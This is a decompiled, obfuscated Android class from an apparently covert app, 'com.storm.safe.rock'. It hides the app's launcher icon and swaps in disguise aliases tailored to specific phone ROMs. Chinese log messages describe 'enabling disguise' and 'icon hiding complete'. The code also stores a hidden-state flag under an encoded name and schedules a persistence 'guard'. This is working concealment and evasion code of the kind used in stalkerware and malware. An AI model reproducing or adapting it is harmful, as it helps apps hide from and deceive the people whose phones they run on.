package com.storm.safe.rock.service.modules;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import com.storm.safe.rock.AppVariantA;
import com.storm.safe.rock.AppVariantB;
import com.storm.safe.rock.AppVariantC;
import com.storm.safe.rock.AppVariantD;
import com.storm.safe.rock.AppVariantE;
import com.storm.safe.rock.AppVariantF;
import com.storm.safe.rock.AppVariantG;
import com.storm.safe.rock.AppVariantH;
import com.storm.safe.rock.AppVariantI;
import com.storm.safe.rock.AppVariantJ;
import com.storm.safe.rock.AppVariantK;
import com.storm.safe.rock.AppVariantL;
import com.storm.safe.rock.AppVariantN;
import com.storm.safe.rock.DefaultLauncherAlias;
import com.storm.safe.rock.activity.TransparentHelperActivity;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.tisxhskrc;
import com.storm.safe.rock.util.StringUtil;
import java.util.Iterator;
import java.util.List;
import kotlin.coroutines.AbstractC0775a0;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC0003a2;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0873ms;
import p000.ExecutorC1158qw;
import p000.t60;
import p000.wj1;
import p000.xj1;
import p000.y21;
import p000.yj1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.b3 */
/* loaded from: classes2.dex */
public final class C0328b3 {

    /* renamed from: a7 */
    public static final /* synthetic */ int f53186a7 = 0;

    /* renamed from: a0 */
    public final Context f53187a0;

    /* renamed from: a1 */
    public final xj1 f53188a1;

    /* renamed from: a2 */
    public boolean f53189a2;

    /* renamed from: a3 */
    public final PackageManager f53190a3;

    /* renamed from: a4 */
    public final C0873ms f53191a4;

    /* renamed from: a5 */
    public final ComponentName f53192a5;

    /* renamed from: a6 */
    public final List f53193a6;

    static {
        new wj1(null);
    }

    public C0328b3(Context context) {
        t60.m214695b6(context, "context");
        this.f53187a0 = context;
        this.f53188a1 = new xj1();
        context.getPackageName();
        PackageManager packageManager = context.getPackageManager();
        t60.m214694b5(packageManager, "context.packageManager");
        this.f53190a3 = packageManager;
        ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
        y21 y21Var = new y21();
        executorC1158qw.getClass();
        this.f53191a4 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
        this.f53192a5 = new ComponentName(context, (Class<?>) DefaultLauncherAlias.class);
        this.f53193a6 = AbstractC0716jf.m213306g5(AppVariantA.class, AppVariantB.class, AppVariantC.class, AppVariantD.class, AppVariantE.class, AppVariantF.class, AppVariantG.class, AppVariantH.class, AppVariantI.class, AppVariantJ.class, AppVariantK.class, AppVariantL.class, AppVariantN.class);
    }

    /* renamed from: a0 */
    public final ComponentName m211756a0() {
        xj1 xj1Var = this.f53188a1;
        Class cls = AppVariantA.class;
        if (!xj1Var.f61147a1 && !xj1Var.f61148a2) {
            if (xj1Var.f61146a0) {
                cls = null;
            } else if (xj1Var.f61150a4) {
                cls = AppVariantF.class;
            } else if (xj1Var.f61149a3) {
                cls = AppVariantH.class;
            } else {
                boolean z = xj1Var.f61151a5;
                cls = AppVariantN.class;
            }
        }
        if (cls != null) {
            return new ComponentName(this.f53187a0, (Class<?>) cls);
        }
        return null;
    }

    /* renamed from: a1 */
    public final Intent m211757a1() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(this.f53187a0, (Class<?>) iuzxujjtqev.class));
            intent.addFlags(268435456);
            return intent;
        } catch (Exception e) {
            t60.m214705c6("fxsnugkm", "获取安全启动Intent失败", e);
            return null;
        }
    }

    /* renamed from: a2 */
    public final yj1 m211758a2(boolean z) {
        xj1 xj1Var = this.f53188a1;
        if (!z && this.f53189a2) {
            return new yj1("ALREADY_HIDDEN", true, "应用图标已处于隐藏状态");
        }
        try {
            ComponentName componentNameM211756a0 = m211756a0();
            PackageManager packageManager = this.f53190a3;
            if (componentNameM211756a0 != null) {
                packageManager.setComponentEnabledSetting(componentNameM211756a0, 1, 1);
                t60.m214702c3("fxsnugkm", "启用伪装: " + componentNameM211756a0.getShortClassName());
            }
            boolean z2 = xj1Var.f61148a2;
            boolean z3 = xj1Var.f61147a1;
            long j = (z2 || z3) ? 1500L : 200L;
            if (j > 0) {
                Thread.sleep(j);
            }
            packageManager.setComponentEnabledSetting(this.f53192a5, 2, 1);
            t60.m214702c3("fxsnugkm", "禁用 DefaultLauncherAlias");
            this.f53189a2 = true;
            m211760a4(true);
            t60.m214714d6("fxsnugkm", "图标隐藏完成（" + (xj1Var.f61146a0 ? "MIUI" : xj1Var.f61148a2 ? "EMUI/HarmonyOS" : z3 ? "MagicOS" : xj1Var.f61149a3 ? "ColorOS" : xj1Var.f61150a4 ? "FuntouchOS" : xj1Var.f61151a5 ? "OneUI" : "AOSP") + "）");
            return new yj1("HIDE", true, "隐藏成功");
        } catch (Exception e) {
            t60.m214705c6("fxsnugkm", "隐藏失败", e);
            return new yj1("HIDE", false, AbstractC0003a2.m48c9("隐藏失败: ", e.getMessage()));
        }
    }

    /* renamed from: a3 */
    public final void m211759a3() {
        Context context = this.f53187a0;
        PackageManager packageManager = this.f53190a3;
        try {
            ComponentName componentName = new ComponentName(context, (Class<?>) iuzxujjtqev.class);
            int componentEnabledSetting = packageManager.getComponentEnabledSetting(componentName);
            if (componentEnabledSetting == 2 || componentEnabledSetting == 3) {
                packageManager.setComponentEnabledSetting(componentName, 1, 1);
                t60.m214714d6("fxsnugkm", "迁移：重新启用 iuzxujjtqev（新架构不再禁用它）");
            }
            try {
                ComponentName componentName2 = new ComponentName(context, (Class<?>) TransparentHelperActivity.class);
                if (packageManager.getComponentEnabledSetting(componentName2) == 1) {
                    packageManager.setComponentEnabledSetting(componentName2, 2, 1);
                    t60.m214714d6("fxsnugkm", "迁移：禁用 TransparentHelperActivity（新架构不再需要）");
                }
            } catch (Exception unused) {
            }
        } catch (Exception e) {
            t60.m214705c6("fxsnugkm", "迁移检查失败", e);
        }
        if (context.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean("icon_hidden", false)) {
            this.f53189a2 = true;
            AbstractC0780a0.m213692a3(this.f53191a4, null, new fxsnugkm$initialize$1(this, null), 3);
        }
    }

    /* renamed from: a4 */
    public final void m211760a4(boolean z) {
        Context context = this.f53187a0;
        try {
            context.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean("icon_hidden", z).apply();
            tisxhskrc.f55188a0.scheduleGuard(context);
        } catch (Exception e) {
            t60.m214705c6("fxsnugkm", "设置icon_hidden失败", e);
        }
    }

    /* renamed from: a5 */
    public final yj1 m211761a5() {
        Context context;
        PackageManager packageManager = this.f53190a3;
        if (!this.f53189a2) {
            return new yj1("ALREADY_SHOWN", true, "应用图标已处于显示状态");
        }
        try {
            packageManager.setComponentEnabledSetting(this.f53192a5, 1, 1);
            t60.m214702c3("fxsnugkm", "启用 DefaultLauncherAlias");
            Iterator it = this.f53193a6.iterator();
            while (true) {
                boolean zHasNext = it.hasNext();
                context = this.f53187a0;
                if (zHasNext) {
                    try {
                        packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) it.next()), 2, 1);
                    } catch (Exception unused) {
                    }
                } else {
                    try {
                        break;
                    } catch (Exception unused2) {
                    }
                }
            }
            packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) TransparentHelperActivity.class), 2, 1);
            this.f53189a2 = false;
            m211760a4(false);
            t60.m214714d6("fxsnugkm", "图标恢复完成");
            return new yj1("SHOW", true, "恢复成功");
        } catch (Exception e) {
            t60.m214705c6("fxsnugkm", "恢复失败", e);
            return new yj1("SHOW", false, AbstractC0003a2.m48c9("恢复失败: ", e.getMessage()));
        }
    }
}
